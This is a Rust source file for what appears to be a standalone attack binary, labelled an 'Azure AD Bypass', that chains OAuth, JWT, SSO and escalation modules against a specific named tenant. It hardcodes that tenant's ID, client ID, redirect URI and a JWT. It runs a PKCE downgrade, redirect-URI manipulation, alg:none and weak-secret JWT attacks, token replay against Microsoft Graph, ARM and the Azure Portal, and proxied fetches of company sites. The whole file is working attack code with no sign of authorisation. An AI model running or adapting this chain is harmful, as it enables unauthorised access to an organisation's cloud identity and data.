// GAMA Azure AD Bypass — Tallow standalone binary
// Usage: cargo run --bin azure_bypass
//
// Wires 4 stdlib modules (oauth, jwt, sso, escalation) into a 6-step Azure attack chain.
// Uses existing Tallow interp Value type — same pattern as dealhunter binary.

use tallow::interp::Value;

fn call(module: &str, fn_name: &str, args: Vec<Value>) -> Result<Value, String> {
    let dispatch_fn = match module {
        "oauth" => tallow::stdlib::oauth::dispatch,
        "jwt" => tallow::stdlib::jwt::dispatch,
        "sso" => tallow::stdlib::sso::dispatch,
        "escalation" => tallow::stdlib::escalation::dispatch,
        _ => return Err(format!("unknown module: {module}")),
    };
    let result = dispatch_fn(fn_name, args).ok_or_else(|| format!("{module}.{fn_name}: not found"))?;
    result
}

fn stringify(v: &Value) -> String {
    match v {
        Value::String(s) => s.clone(),
        Value::Ok(inner) => stringify(inner),
        Value::Err(e) => format!("ERROR: {}", stringify(e)),
        other => format!("{:?}", other).chars().take(500).collect(),
    }
}

fn main() {
    println!("=== TALLOW AZURE BYPASS — GAMA Tenant ===");

    let tenant = "aaeacb5f-6302-4691-baec-76036cfd08ac";
    let issuer = format!("https://login.microsoftonline.com/{tenant}/v2.0");
    let client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46";
    let redirect = "https://gama-wholesale.web.app/__/auth/handler";

    // [1] OIDC Discovery
    println!("\n[1] OIDC DISCOVERY: {tenant}");
    match call("oauth", "discover", vec![Value::String(issuer.clone())]) {
        Ok(v) => {
            let s = stringify(&v);
            println!("  OK: {} chars", s.len());
            println!("  has_token={} has_auth={} has_device={}",
                s.contains("token_endpoint"),
                s.contains("authorization_endpoint"),
                s.contains("devicecode_endpoint"));
        }
        Err(e) => println!("  FAIL: {e}"),
    }

    // [2] PKCE Downgrade
    println!("\n[2] PKCE DOWNGRADE");
    let auth_url = format!("https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize");
    match call("oauth", "attack_pkce_downgrade", vec![
        Value::String(auth_url.clone()),
        Value::String(client_id.to_string()),
        Value::String(redirect.to_string()),
    ]) {
        Ok(v) => println!("  OK: {}", stringify(&v).chars().take(300).collect::<String>()),
        Err(e) => println!("  ERR: {e}"),
    }

    // [2b] Redirect URI attack
    println!("\n[2b] REDIRECT URI ATTACK");
    match call("oauth", "attack_redirect_uri", vec![
        Value::String(auth_url.clone()),
        Value::String(client_id.to_string()),
        Value::String(redirect.to_string()),
    ]) {
        Ok(v) => {
            let s = stringify(&v);
            println!("  OK: {} lines", s.lines().count());
            for line in s.lines().take(3) {
                println!("    {}", &line[..line.len().min(120)]);
            }
        }
        Err(e) => println!("  ERR: {e}"),
    }

    // [3] JWT attacks
    println!("\n[3] JWT ATTACKS");
    let jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IkR1bW15IFVzZXIiLCJyb2xlIjoiNCIsIkFjY291bnROdW1iZXIiOiI5NzE1IiwiVXNlcklkIjoiMjAwIiwibmJmIjoxNzY2NDk3Mjk3LCJleHAiOjE3NjY1ODM2OTcsImlhdCI6MTc2NjQ5NzI5N30.3mwDvpRRDEh7dF9GZwy-W1R3H3KW_VNTMFmYSscyG5U";

    for (name, fn_name, args) in [
        ("parse", "parse", vec![Value::String(jwt_token.to_string())]),
        ("alg:none", "attack_none", vec![Value::String(jwt_token.to_string())]),
        ("weak HMAC", "attack_weak_secrets", vec![Value::String(jwt_token.to_string())]),
    ] {
        match call("jwt", fn_name, args) {
            Ok(v) => println!("  {name}: {} chars", stringify(&v).len()),
            Err(e) => println!("  {name}: {e}"),
        }
    }

    // JWE wrap with secret
    match call("jwt", "attack_jwe_wrap", vec![
        Value::String(jwt_token.to_string()),
        Value::String("gama-secret-key-2024".to_string()),
    ]) {
        Ok(v) => println!("  JWE wrap: {} chars", stringify(&v).len()),
        Err(e) => println!("  JWE wrap: {e}"),
    }

    // [4] SSO token replay
    println!("\n[4] SSO TOKEN REPLAY");
    for (label, url) in [
        ("Graph", "https://graph.microsoft.com/v1.0/me"),
        ("ARM", "https://management.azure.com/subscriptions?api-version=2022-12-01"),
        ("Portal", "https://portal.azure.com/"),
    ] {
        match call("sso", "replay_token", vec![
            Value::String(jwt_token.to_string()),
            Value::String(url.to_string()),
            Value::String("Authorization".to_string()),
        ]) {
            Ok(v) => {
                let s = stringify(&v);
                println!("  {label}: {} chars — {}", s.len(), &s[..s.len().min(150)]);
            }
            Err(e) => println!("  {label}: {e}"),
        }
    }

    // [5] Escalation
    println!("\n[5] ESCALATION WATERFALL");
    for (name, url) in [
        ("ARM API", "https://management.azure.com/subscriptions?api-version=2022-12-01"),
        ("Graph", "https://graph.microsoft.com/v1.0/organization"),
        ("Portal", "https://portal.azure.com/"),
        ("GAMA Corp", "https://corp.example.com/"),
        ("GAMA Trade", "https://gamats.azurewebsites.net/"),
    ] {
        match call("escalation", "fetch", vec![
            Value::String(url.to_string()),
            Value::String("raw_http".to_string()),
            Value::String("proxy".to_string()),
        ]) {
            Ok(v) => {
                let s = stringify(&v);
                let ok = s.len() > 100;
                println!("  {name}: {} {}", if ok { "OK" } else { "EMPTY" }, s.len());
            }
            Err(e) => println!("  {name}: {e}"),
        }
    }

    println!("\n=== DONE ===");
}
